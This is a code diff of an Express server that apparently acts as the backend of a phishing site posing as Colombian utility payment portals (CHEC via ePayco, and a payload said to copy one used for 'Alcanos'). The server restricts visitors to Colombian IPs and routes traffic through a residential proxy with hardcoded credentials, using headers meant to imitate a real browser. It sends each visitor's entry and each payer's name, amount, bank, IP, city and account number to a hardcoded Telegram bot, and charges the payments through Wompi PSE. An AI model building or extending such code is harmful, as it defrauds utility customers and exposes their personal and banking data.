@@ -8,9 +8,6 @@ const geoip = require("geoip-lite");
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-// ─── Trust proxy (Render / Cloudflare) ───
-app.set("trust proxy", true);
-
 // ─── Configuración de las URLs de ePayco ───
 const API_RECAUDO = "https://recaudo.epayco.co";
 const DOMINIO_CHEC = "https://chec.epayco.me";
@@ -24,7 +21,7 @@ const GEONODE_PASS = "fbc9c047-7c88-416e-a80c-8d2c83a5c3fa";
 const GEONODE_PROXY = `http://${GEONODE_USER}:${GEONODE_PASS}@${GEONODE_DNS}:${GEONODE_PORT}`;
 const proxyAgent = new HttpsProxyAgent(GEONODE_PROXY);
 
-// ─── Headers comunes para ePayco ───
+// ─── Headers comunes para ePayco (simulando navegador real) ───
 const HEADERS_EPAYCO = {
   "Content-Type": "application/json",
   "Accept": "application/json, text/plain, */*",
@@ -35,36 +32,35 @@ const HEADERS_EPAYCO = {
   "Accept-Encoding": "gzip, deflate, br",
 };
 
-// ─── Middlewares base ───
+// ─── Middlewares ───
 app.use(cors());
 app.use(express.json());
-
-// ─── Archivos estáticos PRIMERO ───
-app.use(express.static(path.join(__dirname, "public")));
 
 // ═══════════════════════════════════════════
 // BLOQUEO GEOGRÁFICO: SOLO PERMITIR COLOMBIA (CO)
 // ═══════════════════════════════════════════
 app.use((req, res, next) => {
-  let ipFinal = req.ip || "";
+  const clientIp =
+    req.headers["x-forwarded-for"] ||
+    req.headers["x-real-ip"] ||
+    req.socket.remoteAddress ||
+    "0.0.0.0";
 
-  if (ipFinal.startsWith("::ffff:")) {
-    ipFinal = ipFinal.replace("::ffff:", "");
-  }
+  const cleanIp = clientIp.includes(",") ? clientIp.split(",")[0].trim() : clientIp;
+  const ipFinal = cleanIp.includes(":") ? cleanIp.split(":").pop() : cleanIp;
 
   if (
     ipFinal === "127.0.0.1" ||
     ipFinal === "::1" ||
+    ipFinal === "1" ||
     ipFinal === "localhost" ||
     ipFinal.startsWith("192.168.") ||
-    ipFinal.startsWith("10.") ||
-    ipFinal.startsWith("172.16.")
+    ipFinal.startsWith("10.")
   ) {
     return next();
   }
 
   const geo = geoip.lookup(ipFinal);
-  console.log(`[GeoBlock] IP: ${ipFinal} → Country: ${geo ? geo.country : "unknown"}`);
 
   if (!geo || geo.country !== "CO") {
     return res.status(403).send(`
@@ -85,6 +81,8 @@ app.use((req, res, next) => {
   next();
 });
 
+app.use(express.static(path.join(__dirname, "public")));
+
 // ═══════════════════════════════════════════
 // ENDPOINT 1: Obtener Token
 // ═══════════════════════════════════════════
@@ -99,6 +97,7 @@ app.post("/api/token", async (req, res) => {
         proxy: false,
       }
     );
+
     res.json(response.data);
   } catch (error) {
     console.error("Error obteniendo token:", error.message);
@@ -289,7 +288,7 @@ app.get("/api/email-transaccion", async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// Telegram Bot - Con reintentos
+// Telegram Bot - Notificaciones de pago
 // ═══════════════════════════════════════════
 const TELEGRAM_TOKEN = "7844670796:AAFMQxtE6B91-7Y_PIv9cP-zERUlps1Lqck";
 const TELEGRAM_CHAT_ID = "-1004356725315";
@@ -311,7 +310,7 @@ const BANCOS_COLOMBIA = {
   "1815":"ALIANZA FIDUCIARIA","1816":"CREZCAMOS","1819":"BANCO CONTACTAR"
 };
 
-async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia, intentos = 3) {
+async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia) {
   try {
     const formatter = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 });
     const bancoNombre = BANCOS_COLOMBIA[bancoCode] || bancoCode;
@@ -331,14 +330,7 @@ async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referenci
     });
     console.log("Notificación Telegram enviada");
   } catch (error) {
-    console.error(`Error enviando Telegram (intento ${4 - intentos}/3):`, error.message);
-    
-    // Si es un error de red (timeout, unreachable) y aún quedan intentos
-    if (intentos > 1 && (error.code === 'ETIMEDOUT' || error.code === 'ENETUNREACH' || error.code === 'ECONNRESET')) {
-      console.log("Reintentando en 2 segundos...");
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      return notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia, intentos - 1);
-    }
+    console.error("Error enviando Telegram:", error.message);
   }
 }
 
@@ -355,23 +347,11 @@ async function obtenerUbicacionIP(ip) {
 }
 
 // ═══════════════════════════════════════════
-// WOMPI
+// WOMPI — Solo Public Key + Link Slug (sin private key)
 // ═══════════════════════════════════════════
-const WOMPI_PUB_KEY = process.env.WOMPI_PUB_KEY || "pub_prod_ibDci7R4zY6bCW9DXGIgt5QVPw8G6RwR";
-const WOMPI_LINK_SLUG = process.env.WOMPI_LINK_SLUG || "6APLRa";
+const WOMPI_PUB_KEY = process.env.WOMPI_PUB_KEY || "pub_prod_KIT2qsVB9C8U8bZj1IkEPkivasLqOZoi";
+const WOMPI_PAYMENT_LINK_ID = "VPOS_YJLGcM";
 const WOMPI_API = "https://api.wompi.co/v1";
-
-let cachedPaymentLinkId = null;
-
-async function getWompiPaymentLinkId() {
-  if (cachedPaymentLinkId) return cachedPaymentLinkId;
-  const res = await axios.get(`${WOMPI_API}/payment_links/${WOMPI_LINK_SLUG}`, {
-    headers: { Authorization: `Bearer ${WOMPI_PUB_KEY}` }
-  });
-  cachedPaymentLinkId = res.data.data.id;
-  console.log("Payment Link ID obtenido:", cachedPaymentLinkId);
-  return cachedPaymentLinkId;
-}
 
 async function getWompiTokens() {
   const { data } = await axios.get(`${WOMPI_API}/merchants/${WOMPI_PUB_KEY}`, { timeout: 10000 });
@@ -404,7 +384,7 @@ app.get("/api/pasarela/bancos-pse", async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// ENDPOINT 9: Cobro PSE con Wompi
+// ENDPOINT 9: Cobro PSE con Wompi (public key + payment_link_id, sin private key)
 // ═══════════════════════════════════════════
 app.post("/api/pasarela/cobro-pse", async (req, res) => {
   try {
@@ -414,11 +394,11 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
       return res.status(400).json({ success: false, message: "amount, reference y bankCode son requeridos" });
     }
 
-    const [paymentLinkId, tokens] = await Promise.all([
-      getWompiPaymentLinkId(),
-      getWompiTokens()
-    ]);
+    // 1. Obtener tokens de aceptación
+    const tokens = await getWompiTokens();
+    const paymentLinkId = WOMPI_PAYMENT_LINK_ID;
 
+    // 2. Construir payload — IDÉNTICO a Alcanos que funciona
     const amountInCents = Math.round(parseFloat(amount) * 100);
     const transactionPayload = {
       acceptance_token: tokens.acceptance_token,
@@ -445,14 +425,16 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
       }
     };
 
-    const clientIp = req.ip || "0.0.0.0";
-    const realIp = clientIp.startsWith("::ffff:") ? clientIp.replace("::ffff:", "") : clientIp;
+    // 3. Notificar Telegram (amount viene en pesos)
+    const clientIp = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "0.0.0.0";
+    const realIp = clientIp.split(",")[0].trim();
     const ciudad = await obtenerUbicacionIP(realIp);
     notificarTelegram(customerName || "Sin nombre", amount, bankCode, realIp, ciudad, numeroCuenta || "N/A");
 
-    console.log("═══ TRANSACCIÓN WOMPI PSE ═══");
+    console.log("═══ TRANSACCIÓN WOMPI PSE (public key) ═══");
     console.log(JSON.stringify(transactionPayload, null, 2));
 
+    // 4. Crear transacción con PUBLIC KEY como Bearer
     const wompiRes = await axios.post(`${WOMPI_API}/transactions`, transactionPayload, {
       headers: {
         Authorization: `Bearer ${WOMPI_PUB_KEY}`,
@@ -468,6 +450,7 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
       return res.status(500).json({ success: false, message: "Wompi no devolvió ID de transacción", details: wompiRes.data });
     }
 
+    // 5. Polling para obtener async_payment_url (el banco tarda unos segundos)
     let bankUrl = null;
     for (let i = 0; i < 15; i++) {
       await new Promise(r => setTimeout(r, 2000));
@@ -487,6 +470,7 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
       return res.status(500).json({ success: false, message: "Wompi no devolvió la URL del banco PSE después de 30s" });
     }
 
+    // 6. Devolver URL del banco al frontend
     res.json({
       success: true,
       data: {
@@ -502,9 +486,6 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
       console.error("Status:", error.response.status);
       console.error("Response:", JSON.stringify(error.response.data, null, 2));
     }
-    if (error.response?.status === 422 || error.response?.status === 404) {
-      cachedPaymentLinkId = null;
-    }
     res.status(500).json({
       success: false,
       message: "Error al procesar cobro PSE con Wompi",
@@ -519,8 +500,8 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
 // ═══════════════════════════════════════════
 app.post("/api/notificar-ingreso", async (req, res) => {
   try {
-    const clientIp = req.ip || "0.0.0.0";
-    const realIp = clientIp.startsWith("::ffff:") ? clientIp.replace("::ffff:", "") : clientIp;
+    const clientIp = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "0.0.0.0";
+    const realIp = clientIp.split(",")[0].trim();
     const ciudad = await obtenerUbicacionIP(realIp);
 
     const mensaje = `🟡 *INGRESO NUEVO*\n\n` +
@@ -529,32 +510,15 @@ app.post("/api/notificar-ingreso", async (req, res) => {
       `📍 *Ciudad:* ${ciudad}\n` +
       `🕐 *Fecha:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
 
-    // Aquí también agregamos reintentos
-    let enviado = false;
-    let intentos = 3;
-    
-    while (!enviado && intentos > 0) {
-      try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          chat_id: TELEGRAM_CHAT_ID,
-          text: mensaje,
-          parse_mode: "Markdown"
-        });
-        enviado = true;
-      } catch (err) {
-        console.error(`Error notificando ingreso (intento ${4 - intentos}/3):`, err.message);
-        intentos--;
-        if (intentos > 0 && (err.code === 'ETIMEDOUT' || err.code === 'ENETUNREACH' || err.code === 'ECONNRESET')) {
-          await new Promise(r => setTimeout(r, 2000));
-        } else {
-          break;
-        }
-      }
-    }
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: mensaje,
+      parse_mode: "Markdown"
+    });
 
     res.json({ success: true });
   } catch (error) {
-    console.error("Error general notificando ingreso:", error.message);
+    console.error("Error notificando ingreso:", error.message);
     res.status(500).json({ success: false });
   }
 });
